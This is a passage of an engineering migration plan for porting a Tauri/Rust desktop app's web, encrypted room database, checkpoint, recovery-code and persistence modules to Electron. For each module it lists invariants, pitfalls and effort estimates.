**Native/Tauri surface:** objc2_web_kit WKSnapshotConfiguration/takeSnapshotWithConfiguration; objc2_app_kit NSImage/NSBitmapImageRep; tauri Webview::with_webview; block2::RcBlock

### `src-tauri/src/web.rs` — 96 LOC → electron-main (0.25 d)

Module root + shared types: WebHit (fused multi-engine hit with engines list, score, snippet), SearchPage (hits + merged/took_ms/cached/failed with blocked_note sentence), PRIVATE_BLOCKED constant; re-exports fetch/guard/search.

**Replacement:** A types.ts + barrel module in the Electron-main web package; interfaces replace serde structs (shapes already mirrored in src/apiTypes.ts).

**Must preserve:**
- SearchPage.failed distinguishes 'the web had nothing' from 'the engines were blocked/429ed' — reporting the latter as 'No results found.' tells the user a subject doesn't exist because a scraper got rate limited; blocked_note is appended to what the model reads.
- WebHit.source() never empty ('web' fallback); engines list is the cross-engine-agreement ranking signal the UI shows.

**Gotchas:**
- camelCase serde rename is the wire contract; failed defaults to [] for older cached rows.

**Native/Tauri surface:** None

**Subsystem risks:**
- ENGINE SWAP CHANGES THE PRIVACY CLAIM: the browser goes WebKit→Chromium. 'Non-persistent WKWebsiteDataStore' becomes an Electron in-memory partition, but Electron keeps some app-global on-disk state (GPU/shader caches, HSTS store per session, DNS cache) — the 'browser keeps nothing' promise and browser_verify_private must be RE-VERIFIED against the new engine, not ported as an assertion; the current code's whole doctrine is that this exact failure is silent.
- Content blocking moves from WebKit's network-process compiled rules (undetectable, unbypassable by page JS) to main-process webRequest interception — verify @ghostery/adblocker-electron plus the custom private-range handler actually intercept WebSocket connects and service-worker/fetch sub-resources, and that no remote filter-list fetch is enabled (owner: never phone home for a list). The port-scan-via-ws defense has a dedicated rationale in rules.rs and no test today that exercises a live socket.
- The subsystem is saturated with cross-subsystem seams that must land first or simultaneously: privacy redactor (entities_in/mask_outbound_web/outbound_url_hides), extraction/Readability (saved.rs + fetch_readable — and the split rule says document parsing may belong to the Python sidecar, so decide ONE home), room DB (journal + web cache + file import funnel), agent loop (perceive_image, ToolEffects, turn steps, room_mcp catalog gating), sidecar /web_search. A file-by-file port that stubs these will ship inert fixes — the audit history shows exactly this failure mode.
- BEHAVIOR ENCODED AS EXACT STRINGS: dozens of error/refusal messages are functional (worded to stop model retry loops, to avoid fabricated reasons, to distinguish 'nothing selected' from 'page refused' by literal string match between Rust and page.js). Treat message text as spec; the NOTHING_SELECTED and READ_MAX cross-file pins must become shared constants, not re-typed prose.
- SSRF pinning in Node is subtle: undici agents pool per-origin and custom lookup pins per-host — a naively shared agent leaks the pin across hosts, and Node fetch follows redirects by default. The guarded_get structure (fresh pinned client per hop, manual redirect loop, re-guard every hop, resolve-ALL-addresses) must be ported structurally and re-tested with the full guard.rs case tables; WHATWG URL normalization differences vs reqwest::Url can silently change both guard verdicts and cache_key equality.
- Deleting the workaround layers (ticket bridge, EVAL_LOST taxonomy, sub-frame record defenses, download stat-watcher, NO_POPUPS_JS) is the biggest win but also the biggest risk: each encodes a truthfulness behavior (navigation-interrupted actions reported as 'navigated, later steps did not run', never 'done' or 'failed') that must be re-expressed in Electron's event model. Port the behavior tests (Rust unit tests + e2e/page-script/*.mjs suites) BEFORE the code, and run the wdio capture flow — the repo's history shows fully green suites missing live defects repeatedly.
- yt-dlp architecture trap: bundling yt-dlp into the PyInstaller sidecar looks cleaner but freezes its update cadence to app releases — the standalone binary + self-update exists because YouTube breaks extractors monthly (Aug 2026 403 wave). Keep the independent binary. Also: child_process kill of yt-dlp does not reliably kill a mid-merge ffmpeg grandchild on macOS — needs process-group handling the Rust code never needed (kill_on_drop covered it).
- Coordinate-system fidelity for the vision loop: click_at is CSS px, capturePage returns device-scale pixels, and the downscale-to-1280 note math (picture_per_css) currently guards against confidently-wrong factors. NativeImage exposes scaleFactor, so the rewrite can be exact — but if it silently changes the ratio semantics, models will click the wrong elements with no error.
- The .room migration story intersects here: browse journal rows, web_meta JSON, and the web search/page/image cache tables live in the encrypted room DB; the one-time converter must carry them or Clear-journal/browser history claims silently break for migrated rooms.

## 5. DB, crypto & rooms

db-crypto-rooms: the encrypted .room (SQLCipher 4) file itself and every room lifecycle path around it. Three strata: (1) the DB layer — src-tauri/src/db.rs + 22 modules under src-tauri/src/db/ (jobs.rs excluded, owned elsewhere) holding the SCHEMA constant, a ~30-step idempotent migrate(), and per-table CRUD for files/chunks/FTS5 search, trash (chunk-moving, not flag-filtering), file versions with pinning, staged artifacts, chats/messages/memories, privacy entities, recordings + crash-recovery PCM checkpoints, voiceprints, podcasts, story lists, skills, workflows and web caches; (2) crypto/unlock — SQLCipher keying pinned in exactly one function (apply_key), wrong-password vs damaged-file classification, AES-GCM+PBKDF2 recovery-code sidecar, SQLCipher rekey, Touch ID via Keychain SecAccessControl; (3) lifecycle commands — create/open/close/rename room with a strictly-ordered teardown (browser closed and jobs parked BEFORE the DB handle drops, epoch bump against straggler writers), whole-room checkpoints (VACUUM INTO + plaintext manifest sidecar with self-healing reconcile) and rollback with drain-and-refuse semantics, the ⌘Q unsaved-edits quit door, and window-geometry persistence with an off-screen-restore guard. Rewrite target: everything lands in Electron main on better-sqlite3-multiple-ciphers (owner explicitly allows replacing SQLCipher provided existing .room files migrate); Touch ID and quit/geometry move to Electron built-ins. 21 tauri commands in this group. The dominant migration risk is opening existing SQLCipher-4 .room files and preserving ~40 comment-defended invariants (born-current user_version stamp, single keying site, teardown ordering, trash chunk-move) whose regression is silent data loss.

### `src-tauri/src/db/schema.rs` — 2125 LOC → electron-main (5 d)

The room file format: SCHEMA constant (all ~30 tables incl. FTS5 virtual table + sync triggers), apply_key/verify_key (SQLCipher keying + cipher_compatibility=4 pin in ONE function), classify_first_read (wrong password vs damaged file), create_room/open_room/open_room_readonly, and migrate() — the full idempotent upgrade path for old rooms (guarded CREATEs/ALTERs, FTS porter rebuild, three user_version one-time repairs, orphan-message adoption, derived_from recovery).

**Replacement:** TS module in Electron main on better-sqlite3-multiple-ciphers opened with SQLCipher-compatible settings (cipher='sqlcipher', legacy=4) so existing .room files open unmodified — this IS the migration story; keep SCHEMA as one SQL string, port migrate() statement-for-statement, applyKey() stays the single keying+pinning function, read-only opens via {readonly:true}.

**Must preserve:**
- apply_key is the ONLY place a connection is keyed AND it pins cipher_compatibility=4 — two of four call sites used to miss the pin; a structural test enforces exactly one keying site and one pin site
- classify_first_read: only SQLITE_NOTADB (or unclassifiable) may say WRONG_PASSWORD; every other code names itself — a failing disk used to be reported as a wrong password forever; only the error CODE travels (a path is room content)
- CURRENT_USER_VERSION=3 stamps new rooms born-current; stamped 0, the next unlock ran repair #1 which NULLs every embedding in the room. A source-scanning test asserts the constant equals the highest 'user_version < N' in migrate — keep an equivalent lockstep guard
- Every table/column lives in BOTH SCHEMA and migrate(): create_room runs only SCHEMA, open_room only migrate — a one-sided addition is missing from either all new rooms or all old ones (web_searches shipped broken this way)
- create_room_file removes the half-created file (+ -wal/-shm) when init fails — SQLite mints the file before keying can fail, and the leftover blocked every retry with 'A file already exists'
- open_room_readonly: verify/info promise to read only — enforced by SQLITE_OPEN_READ_ONLY, not by remembering not to write; migrate must fail on it
- add_column_if_missing swallows exactly 'duplicate column' and 'no such table' (the latter because a later CREATE mints the table WITH the column; treating it fatal made old rooms unopenable)
- FTS5 porter rebuild: an existing chunks_fts whose stored sql lacks 'porter' is dropped and rebuilt (tokenizers cannot be altered); backfill only when the table was just created
- migrate must survive non-JSON job_artifacts.content (json_valid guards) or the room refuses to open
- Room format check: meta.format='roomai'; password min 8 chars enforced at the encrypting seam, not just the form
- reindex_one_file is all-or-nothing: user_version stamps once per sweep, so a half-failed rebuild would leave a file permanently unfindable

**Gotchas:**
- Verify better-sqlite3-multiple-ciphers actually decrypts real field .room files (SQLCipher 4 defaults: PBKDF2-SHA512 256k iters, HMAC-SHA512, 4096 page) before committing to no converter; a one-time VACUUM INTO converter is the sanctioned fallback
- FTS5 + porter must be compiled into the chosen prebuilt (it is in better-sqlite3 defaults — test fts5_is_available exists for this exact reason)
- better-sqlite3 is synchronous on the main thread: migrate() on a big old room and repairs like 'UPDATE chunks SET embedding=NULL' will freeze the UI unless DB runs in a worker_threads/utilityProcess
- The include_str! self-scanning tests (keying-site count, user_version lockstep) need TS equivalents (read own source or an eslint rule) — a doc comment is not a guard
- SQLite parses bare 'cast' in a SELECT list as CAST(x AS — hence cast_json column name; do not 'clean up' names

**Native/Tauri surface:** rusqlite/SQLCipher PRAGMAs: key, rekey, cipher_compatibility, user_version, foreign_keys; FTS5 virtual table (porter unicode61)

### `src-tauri/src/db/files.rs` — 2039 LOC → electron-main (4 d)

File CRUD: insert (with atomic chunk indexing), in_transaction helper, section-only visibility (origin_destination/library_visibility), listings (full/brief/inventory/summary), counts, derived_from provenance links, media/web meta setters, available_name Finder-style dedup, trash/restore/empty-trash with actor attribution, rename (releases artifact_key), fuzzy name finders for the agent (find_file_like* family), FTS content search. ~940 lines are tests.

**Replacement:** Direct TS port over better-sqlite3: inTransaction wraps db.transaction-style BEGIN IMMEDIATE with an is-autocommit check (db.inTransaction), prepared statements per query; blobs as Buffer. The fuzzy-finder SQL (LIKE with ESCAPE, ORDER BY created_at DESC, rowid tiebreak) ports verbatim.

**Must preserve:**
- in_transaction: no-op when the caller already holds a transaction (SQLite has no nested BEGIN); file row + chunks must land together
- trash_file MOVES chunks to trashed_chunks in one transaction and refuses double-trash (a re-stamp would destroy the actor record and overwrite the real chunk stash with an empty one); restore moves them back verbatim, embeddings included, so vector search works the moment restore returns
- get_file_meta/get_file_name/bytes/text all carry trashed_at IS NULL — a by-id read that survives delete resurrects the file in tabs/jobs/cloud turns; any_file_name is the SINGLE exception (receipts only, name only)
- TrashActor user/agent/app recorded at deletion ('what did the agent delete' is the trash's reason to exist; 'ask before AI edits' is OFF by owner decision)
- available_name: case-insensitive 'stem (n).ext' stepping with LIKE-wildcard escaping; trashed files do NOT hold their name (numbering around invisible files) so restore may legally recreate a duplicate name
- rename_file clears artifact_key (renaming = adopting; the next generator run must mint fresh, not version over the user's copy) and reports zero-rows as failure (stale-id rename must not 'succeed')
- find_newest_named excludes generated 'Full pass — '/'Room summary' outputs when resolving a pass SOURCE (else a re-run summarizes its own previous output); rowid DESC tiebreak on same-second creates
- find_file_like_qualified: try the FULL string before the last path segment (folder-qualified names round-trip from list_room_files; slash is legal in a real name)
- room_file_count shares the exact NOT_TRASHED predicate with list_files (count and list must derive from one predicate); new_source_file_count additionally excludes source='generated' (a workflow must not see its own output as new work and loop)
- mark_section_only is best-effort by design (a failure is a tidiness fault, must not fail the creation); set_library_visibility is idempotent state-setting, never toggle

**Gotchas:**
- Trash is chunk-MOVING, not a WHERE clause — two hot retrieval queries never join files, so filter-in-place silently reintroduces retrieval of deleted files; port the mechanism, not a 'simpler' flag
- original_bytes can be hundreds of MB (recordings); better-sqlite3 materializes whole Buffers — watch memory on get_file_full for video-sized files
- LIKE escaping (like_escape + ESCAPE '\') must be applied uniformly across files/messages/memories searches — they run off one query text and diverging rules was a shipped bug

**Native/Tauri surface:** rusqlite only

### `src-tauri/src/commands/rooms.rs` — 958 LOC → electron-main (4 d)

Room lifecycle commands: create_room/open_room (+open_room_impl for rollback reentry), recovery-key commands, Touch ID commands, close_room, drain_inflight (bounded cancel-and-wait over asks/jobs/recording with DrainReport), park_inflight_jobs_for_teardown, teardown_open_room (the strictly-ordered per-room state teardown, generic over runtime for testability), room_info/rename_room/take_pending_open, parked rec-recovery error delivery (park-then-emit race fix), spawn_room_server_if_enabled.

**Replacement:** TS in Electron main: ipcMain.handle endpoints replacing #[tauri::command]; a RoomState singleton owning {db, path, name, password}; teardown as one ordered function (close browser BrowserView/WebContentsView → park jobs while DB open → drop handle → bump epoch → stop MCP bridge + discovery file → clear consents/caches/previews → notify sidecar forget_room_memory); drain with AbortController-style flags and bounded waits.

**Must preserve:**
- Open-over-open (Finder double-click on a second room) fully tears down the old room FIRST — its MCP bridge/bearer token must not survive to serve tools resolving against the NEW room; teardown runs only after the password proved right so a failed unlock never locks the current room
- Teardown ORDER is load-bearing: browser closed and jobs parked BEFORE the room handle drops (both need the DB open); epoch bumped the instant the handle drops so path-pinned background writers re-checking it can't land into the reopened room (rollback keeps the same path, so a path pin can't tell)
- park_inflight_jobs_for_teardown stamps parked_reason=PARKED_BY_LOCK on 'running' jobs at the last moment the DB is reachable (a runner inside a model call observes cancel minutes later, finds no room, writes nothing — the row would claim 'running' forever); checkpoint cursor/state untouched (parked ≠ cancelled)
- drain_inflight: recording stop awaited (bounded 30s), ask/job cancel flags + cancel TREE (roots alone miss work a run started), bounded waits reported; close_room ignores the report, rollback refuses on any false
- Rec-recovery failure is PARKED first, emitted second (unlock returns before workspace listeners mount; a fixed-timer emit loses the cold-start race); take_rec_recovery_error clears on read; teardown drops a parked message with its room (else the NEXT room's workspace toasts about a room the user isn't in)
- room mutex poisoning must not end the session (with_room recovers a poisoned lock — one panic under the lock used to turn every later action into a panic)
- All lifecycle commands refuse while rolling_back() (ROLLBACK_BUSY) except open_room_impl which the rollback itself uses
- Password lives in memory on the Room struct for rekey/duplicate/rollback flows — never written anywhere but Keychain
- quiesce_stale_jobs on every open (a job left 'running' belongs to a dead process → 'paused' so the UI offers Resume); recover_rec_chunks on open with failures REPORTED not swallowed
- rename_room updates BOTH the room's meta (authority, travels with the file) and the recents entry (rooms that are locked need their own copy); name capped at 120 chars

**Gotchas:**
- Node has no mutex — main-thread single-threading gives atomicity between awaits only; every await inside lifecycle handlers is an interleaving point where another IPC call can observe half-torn-down state. Guard with an explicit busy flag exactly like rolling_back
- The parked-message pattern (pull on mount + push for already-mounted) still applies in Electron — webContents.send before did-finish-load is dropped the same way
- Do not translate teardown into scattered event listeners: the Rust tests assert the ORDER (park-before-handle-drop, epoch bump) — port those tests

**Native/Tauri surface:** tauri::State/AppHandle/Manager/Emitter; tauri::async_runtime::spawn / spawn_blocking; tokio sleep; tauri events (rec-error, mcp-status)

### `src-tauri/src/commands/room_checkpoints.rs` — 890 LOC → electron-main (3 d)

Whole-room checkpoints and rollback: plaintext manifest sidecar dir <room>.checkpoints/ with encrypted <uuid>.roomck payloads (VACUUM INTO temp-then-rename), self-healing reconcile (dedupe, drop missing, refresh sizes, sweep .tmp, adopt orphans), auto safety copies (capped at 3), disk-space pre-checks via df, checkpoint-id path-traversal guard, stranded-checkpoint detection after password change, and rollback_room_checkpoint (flag → drain-and-refuse → verify password → safety copy → teardown → file swap → reopen, with explicit error text for every partial-failure branch).

**Replacement:** TS in main: VACUUM INTO through better-sqlite3 (must run in the DB worker — it holds the connection for the whole multi-GB copy); fs.statfs (Node ≥18.15) replaces shelling to /bin/df; manifest writes via write-temp-fsync-rename with mode 0o600; the rollback state machine as one async function with a finally-cleared busy flag.

**Must preserve:**
- Registry lives OUTSIDE the room DB (it must survive the DB being swapped); only names/dates/sizes are plaintext, payloads are full SQLCipher copies keeping the current key
- Manifest written 0600 — checkpoint NAMES are user-typed ('Before the tax settlement') and leak room subject matter to anyone with the disk
- checkpoint_id_ok rejects (never sanitizes) anything not shaped like our own uuid — delete/rollback paste the id into a path and then unlink/swap the result
- reconcile is crash-recovery in BOTH directions: entries without payloads dropped, orphan .roomck ADOPTED as 'Recovered checkpoint' (a crash between rename and manifest append must not leak an invisible multi-GB file), stale .tmp swept; write_checkpoint reconciles BEFORE creating its payload so its own fresh file isn't adopted as an orphan
- Disk pre-check with 256MB headroom, in words, BEFORE writing; a path df can't measure never blocks a checkpoint that would have worked
- Rollback refuses unless drain came back fully clean (a writer that never observed cancel can't be proven not to write post-swap); room-epoch bump is the backstop for non-cancellable path-pinned writers
- Rollback verifies the checkpoint opens with the CURRENT password before tearing anything down, with a message that explains the stranded-by-password-change case (verify_password's own text would be a lie — the user typed nothing)
- Swap failure reopens the ORIGINAL room and reports BOTH errors if that reopen also fails (the user must never silently end at 'No room is open')
- After swap, open_room_impl re-reads the RESTORED room's leash/server settings — the checkpoint's config is authoritative (decided)
- Timestamps are ISO-8601-Z produced by hand (Hinnant civil_from_days — the app has no chrono); manifest dates must match the DB's strftime format or screens render the wrong hour
- change_password re-keys every checkpoint copy (checkpoint_ck_paths) and stranded ones are recomputed from the files themselves, never remembered

**Gotchas:**
- block_in_place has no Node equivalent and none is needed — but the synchronous VACUUM INTO WILL freeze the app unless DB lives in a worker; this is the strongest single argument for a DB utilityProcess
- fs.copy then rename must stay on ONE volume (cross-volume rename is not atomic and not allowed) — stage the swap temp beside the room, exactly as here
- In JS the rollback busy flag needs try/finally discipline replacing the Drop guard — every early return must clear it

**Native/Tauri surface:** /bin/df -Pk subprocess; VACUUM INTO; std::fs rename/copy/metadata; tokio::task::block_in_place; tauri event room-rolled-back

### `src-tauri/src/db/versions.rs` — 642 LOC → electron-main (2.5 d)

Two concerns: (1) file version history — compound snapshots (bytes+text+rec_meta+provenance), VERSIONS_KEPT=10 rolling prune that never evicts pinned rows, per-version delete, versions_bytes; (2) room-file crypto ops — verify_password on a throwaway connection, rekey/rekey_copy (SQLCipher PRAGMA rekey), the AES-256-GCM + PBKDF2 (200k) recovery-code sidecar (<room>.recovery) with rejection-sampled 24-char code, atomic temp-then-rename sidecar writes, reclaimable_bytes/vacuum/vacuum_into.

**Replacement:** Version CRUD ports straight to TS/better-sqlite3. Recovery crypto via node:crypto (crypto.pbkdf2Sync sha256 200k iters; createCipheriv/createDecipheriv aes-256-gcm with the 16-byte tag appended to ct — the on-disk RecoveryWrap JSON {v,salt,nonce,ct} must stay byte-compatible so existing sidecars keep working). rekey via PRAGMA rekey on better-sqlite3-multiple-ciphers; VACUUM INTO with single-quote escaping (no bound params allowed).

**Must preserve:**
- Snapshot is COMPOUND: for a Recording the bytes are the unchanged WAV and the overwrite replaces the TRANSCRIPT — bytes-only restore could never bring old words/speakers/cuts back
- Prune counts and deletes only pinned=0 rows; a pinned version survives any number of saves (the one escape from the rolling window)
- Recovery wrap lives in a PLAINTEXT sidecar beside the room — it cannot live inside the DB it unlocks (chicken-and-egg); safe because the wrap is AES-GCM under a key stretched from the high-entropy code
- Recovery code: 31-char look-alike-free alphabet, REJECTION-SAMPLED (byte%31 gave A–H a ~12% bias — a distribution test enforces uniformity); normalize_code strips dashes/spaces and uppercases
- Sidecar written temp-then-rename+fsync on the same volume — fs::write truncate-first meant a crash during password change destroyed the ONLY copy of the sealed password while has_recovery still said yes
- recover_password returns plain Err on wrong code/corrupt file — never a panic; version check (v!=1) says 'written by a newer version'
- verify_password uses a FRESH throwaway connection (change-password must not rekey through the open handle; walk-up attacker scenario)

**Gotchas:**
- Keep the sidecar format byte-identical — users have printed codes for existing .recovery files; test decrypt of a Rust-written sidecar from TS
- node:crypto GCM: Rust appends the 16-byte tag to ct; use setAuthTag on the split tail
- If the DB engine changes ciphers, PRAGMA rekey semantics must be re-verified AND change_password must still re-key every checkpoint copy (see room_checkpoints)
- VACUUM INTO takes no bound parameters — the single-quote escaping is load-bearing (a test creates a room with a quote in its path)

**Native/Tauri surface:** SQLCipher PRAGMA rekey; VACUUM INTO; aes-gcm 0.10 detached in-place API; pbkdf2-hmac-sha256; rand OsRng

### `src-tauri/src/db/workflows.rs` — 586 LOC → electron-main (1 d)

Workflow persistence: workflows (immutable WorkflowDef JSON; a RUN snapshots it into the job plan so later edits never corrupt a paused run), workflow_runs (status by job id), schedules (kind/param, catch_up, next/last run bookkeeping, due_schedules join).

**Replacement:** TS port; definition/binding stored as JSON text, surfaced parsed (callers never re-parse).

**Must preserve:**
- Runs execute against the SNAPSHOT in the job plan, not the live definition
- due_schedules returns (Schedule, Workflow) pairs filtered on enabled + next_run_at <= now
- delete cascades runs/schedules via FK

**Native/Tauri surface:** rusqlite only

### `src-tauri/src/db/story.rs` — 573 LOC → electron-main (1 d)

Create-page data: story_cast (a character IS a picture — face_file_id drives cross-shot consistency; ON DELETE SET NULL so trashing a portrait never deletes the hero), story_lists (one aspect_ratio per list, per-medium resolutions), story_shots (still+clip chain, cast_ids JSON, reorder).

**Replacement:** TS port, straightforward CRUD.

**Must preserve:**
- face_file_id is the load-bearing column (same picture per call = same face; prose is for prompts and memory)
- Shots keep BOTH still and clip so re-animation never pays to redraw the frame
- aspect_ratio is per-LIST by domain claim (a still becomes the clip's literal first frame)
- On-screen vocabulary: SHOT LIST, never 'script' (Scripts already means runnable Python)

**Native/Tauri surface:** rusqlite only

### `src-tauri/src/db/artifacts.rs` — 451 LOC → electron-main (1.5 d)

ART-1 staged artifact funnel: generators write bytes into staged_artifacts INSIDE the encrypted room, validation happens there, and one transaction commits into files — matching by artifact_key so a re-run versions its previous output instead of minting 'Plan (3).md' forever. discard/sweep for interrupted runs; file_provenance reader.

**Replacement:** TS port; commit_staged as one better-sqlite3 transaction that snapshots the existing artifact (snapshot_file_version), overwrites content, transfers provenance, and deletes the staging row. MAX_ARTIFACT_BYTES=64MB cap stays.

**Must preserve:**
- A write that does not finish must not be visible at all (staging is invariant #1); a finished write over an earlier artifact must version it, not destroy it (#2)
- Staging lives INSIDE the room — a /tmp scratch file would put room content outside the encryption boundary, the one thing the app never does
- Match on artifact_key, not final name (a user file already holding the requested name pushes the artifact to 'Plan (2).md' while its key stays 'Plan.md'); pre-key rooms fall back to name matching
- sweep_staged_artifacts runs on every room open (migrate) — rows are transient by construction
- Provenance is ids/names ONLY, never content

**Gotchas:**
- The commit path calls into snapshot_file_version and insert_chunks inside its own transaction — this is why insert_chunks must use SAVEPOINTs

**Native/Tauri surface:** rusqlite only

### `src-tauri/src/db/skills.rs` — 449 LOC → electron-main (1 d)

Agent Skills persistence: skills (SKILL.md row: name/description/instructions/enabled/agent owner) + skill_resources (relative-path folder tree as BLOBs) — an encrypted representation of the portable skill-folder contract; find by name-or-id; execute_existing guards stale-tab saves.

**Replacement:** TS port; keep the SKILL_GONE stale-save error contract.

**Must preserve:**
- agent='' means GENERAL (offered to every agent) — what every pre-2026-07-24 skill stays
- update on a deleted skill errors instead of reporting 'Saved' while keeping nothing (the execute_existing origin story)

**Native/Tauri surface:** rusqlite only

### `src-tauri/src/db/podcasts.rs` — 437 LOC → electron-main (1 d)

Podcast scripts as DATA (not a room file): hosts/turns/cast_json keyed by script file id, audio_file_id for the rendered episode, speaker-label stripping and cast normalization helpers (join key is the speaker NAME appearing in turns).

**Replacement:** TS port; the strip_speaker_label / normalize_turn_speakers string logic moves as pure functions with their tests.

**Must preserve:**
- Column is cast_json not cast — bare 'cast' in a SELECT list parses as CAST(x AS in SQLite: the INSERT works and only the read breaks
- Cast is written once from the script then owned by the user's edits (never re-derived)
- audio_file_id ON DELETE SET NULL — a plain room file so it plays/seeks/exports with no special case; NULL = never recorded

**Native/Tauri surface:** rusqlite only

### `src-tauri/src/db/messages.rs` — 395 LOC → electron-main (1 d)

Message persistence + the shared search-text toolkit: like_escape, search_terms (MAX 8 — cap widens, never narrows), like_all_clause, messages_like, insert_message/insert_handoff_message (kind='handoff' compaction marker), list/recent_messages (history starts at latest handoff), delete_message, room_counts.

**Replacement:** TS port. recent_messages' handoff-anchored window and the kind column semantics must survive — the sidecar's context compaction depends on them.

**Must preserve:**
- kind is additive metadata, deliberately NOT a new role (role is pattern-matched through all LLM plumbing); 'handoff' marks a compaction summary and recent_messages starts from the latest one
- like_escape + ESCAPE '\' pairing on every LIKE query — '50%' must not match every '50'
- Search-term cap IGNORES extra words (widens results) — user input can never silently drop a matching row

**Native/Tauri surface:** rusqlite only

### `src-tauri/src/db/privacy.rs` — 390 LOC → electron-main (1 d)

PRIV-1/2 gatekeeper storage: privacy_entities (real string ↔ stable placeholder, category series like '[Person A]', source user|scan) and privacy_scans per-file bookkeeping (text+rules sha256) so imports/rule edits re-scan only what changed.

**Replacement:** TS port; sha256 via node:crypto. The placeholder-series allocation (next free '[Person N]' per category) ports as a query + counter.

**Must preserve:**
- Placeholder is stable for the room's life — cloud conversations stay coherent across turns and answers re-personalize locally
- source='user' (iron-clad block list) vs 'scan' (reviewable) distinction
- Scan bookkeeping keys on BOTH text hash and rules hash

**Gotchas:**
- The in-memory policy cache (commands layer) must be cleared on room teardown — same invariant class as the MCP token; the cache consumer is outside this file but the data contract starts here

**Native/Tauri surface:** sha2

### `src-tauri/src/db/voices.rs` — 370 LOC → electron-main (1 d)

Room-scoped voiceprints (biometric data — deliberately per ROOM, never per app): voice_ids (name-keyed L2-normalized centroid BLOB, frames/takes evidence), voice_rejects (negative examples so a wrong match isn't wrong forever), enroll (weighted centroid merge), forget.

**Replacement:** Table stays in main (TS); the diarization consumer moves to the Python sidecar, so main must ship known_voices/rejects to the sidecar per recognition request over the local HTTP seam (embeddings are ~192-float blobs — cheap), and receive enroll/reject writes back.

**Must preserve:**
- Keyed by NAME (one person, one voice) — recognized speakers are keyed by name not label, a shipped-bug lesson
- Per-room by design: a library outliving the room would let a person named in one private room be recognized by name in an unrelated one — the cost (re-naming per room) is accepted
- Rejects are per (name, emb) — correcting a wrong match must teach the negative, not just the other name
- Never sent to any model, local or cloud

**Gotchas:**
- The cross-boundary flow (DB in Electron main, matcher in Python) is new plumbing the Rust code never needed — design the seam explicitly or enrollment writes race recognition reads

**Native/Tauri surface:** rusqlite only

### `src-tauri/src/db/embeddings.rs` — 353 LOC → electron-main (1.5 d)

Vector search storage: f32↔little-endian-BLOB codecs, cosine similarity (plain and blob-direct), chunks_missing_embedding backfill feed, for_each_chunk_embedding full scan, chunks_by_rowids, search_chunks_fts_ranked + fts_file_matches (BM25 keyword side of the blend), recent_chunks.

**Replacement:** TS port: Buffer→Float32Array (LE matches JS TypedArray on all supported platforms), cosine in a tight loop; FTS queries verbatim. If the full-scan cosine over ~20k×768 f32 proves slow on the main thread, move scoring into the DB worker thread — embedding GENERATION stays in the Python sidecar per the split rule, only storage/scoring is here.

**Must preserve:**
- Corrupt/foreign blob (len % 4 != 0) reads as None and is skipped, never mis-scored
- for_each_chunk_embedding and fts_file_matches never join files — they rely on the trash chunk-move invariant, not a WHERE clause
- search_chunks_fts_ranked returns chunk ROWID (blend key); files_content_fts is the same shape returning file id — tune one, tune the other

**Gotchas:**
- Float32Array.buffer alignment: slice the Buffer copy, don't view an offset Buffer directly (byteOffset misalignment throws)

**Native/Tauri surface:** FTS5 bm25()

### `src-tauri/src/db.rs` — 338 LOC → electron-main (1.5 d)

DB facade: declares/re-exports all db submodules and owns the shared search-index plumbing — FILE_META_COLS/NOT_TRASHED SQL constants, file_meta_row mapper, insert_chunks/clear_chunks (chunking into FTS index), CHUNK_CAP, file_names_hint for model errors, column_exists/table_exists migration guards, search_key normalization, and test helpers (mem(), temp_room_path()).

**Replacement:** TS module in Electron main over better-sqlite3-multiple-ciphers: one shared column-list constant + row mapper, insertChunks/clearChunks using SAVEPOINT (db.exec) around a prepared-statement loop. Hebrew nikud stripping and chunk_text come from wherever the extraction port lands (Python sidecar) — precompute chunks before the synchronous DB write, or port the two small string functions to TS so indexing stays local to main.

**Must preserve:**
- insert_chunks routes a TRASHED file's chunks into trashed_chunks, not the live index — background OCR/STT finishing after a delete must not re-index a deleted file; the routing is here so the invariant 'chunks holds only in-room text' is true by construction
- Chunking is wrapped in a SAVEPOINT (never BEGIN — commit_plans/restore_file_version already hold a transaction and SAVEPOINTs nest); on failure it rolls back so a file is never half-indexed
- Nikud/cantillation stripped before indexing (unicode61 treats combining marks as separators; pointed קֹהֶלֶת would index as unmatchable fragments)
- CHUNK_CAP=20_000 (raised from 2000 which truncated a Hebrew Bible); partially_indexed flag derives from a live chunk-count vs this cap — the two must agree
- NOT_TRASHED clause is written once and assumes alias f; every listing/count/search reuses it
- clear_chunks deletes from BOTH chunks and trashed_chunks (a trashed file's stash must track content rewrites or restore resurrects stale text)

**Gotchas:**
- A rewriter who batches chunk inserts with BEGIN instead of SAVEPOINT breaks the callers that already hold a transaction — there are dedicated tests for both properties
- file_meta_row indices are positional against FILE_META_COLS; keep them one constant or they drift

**Native/Tauri surface:** rusqlite (SQLCipher); aes-gcm/pbkdf2/rand/sha2 (re-exported for versions.rs)

### `src-tauri/src/db/recordings.rs` — 313 LOC → electron-main (1.5 d)

Live-recording persistence: recordings meta JSON (row existence = 'is a recording'), rec_chunks PCM crash checkpoints (f32→16-bit LE), finalize_rec_audio (WAV write + checkpoint clear as ONE transaction), recover_rec_chunks (splice checkpointed tail onto stored WAV on room open; per-file failure isolation).

**Replacement:** TS port in main: PCM conversion is a few lines over Float32Array/Int16Array; WAV decode/encode helpers (44-byte header math) port to TS or call the Python sidecar's audio lane — recommend TS since recovery runs synchronously at unlock and the WAV format here is fixed 16-bit mono.

**Must preserve:**
- finalize writes WAV and clears checkpoints atomically — split, a crash between them made the next recovery splice the tail on AGAIN (audio played twice)
- recover_rec_chunks isolates failures per file (one damaged WAV must not doom every other interrupted recording, on every unlock, forever) and reports counts only (a name is room content)
- A file trashed mid-session is SKIPPED not failed (checkpoints stay for a later restore)
- get_rec_meta joins files for the trash clause — the meta IS the transcript and a by-id read of a deleted recording must not hand it back

**Native/Tauri surface:** rusqlite only (WAV codec in crate::recording)

### `src-tauri/tests/roomfile.rs` — 289 LOC → electron-main (1 d)

Integration tests for the room file format: creates a real SQLCipher file and asserts the on-disk bytes are not plaintext SQLite (header + content probe), wrong password → exactly 'WRONG_PASSWORD', and four legacy-room migration scenarios built by hand-crafting pre-migration schemas (sessions adoption, skills agent column both directions, jobs parked_reason, browse_journal session) plus chunking/extraction smoke.

**Replacement:** Vitest/node:test integration suite against the TS db layer: same hand-built legacy fixtures (plain better-sqlite3 with PRAGMA key writing old schemas), same on-disk plaintext probes. These are the acceptance tests for 'existing .room files still open' — port FIRST and run against real field rooms too.

**Must preserve:**
- The encryption assertion reads raw file bytes (header != 'SQLite format 3\0', no plaintext content windows) — keep it, it is the only test that would catch a silently-unencrypted replacement DB
- Each migration test re-opens twice: the duplicate-column no-op IS the idempotence check
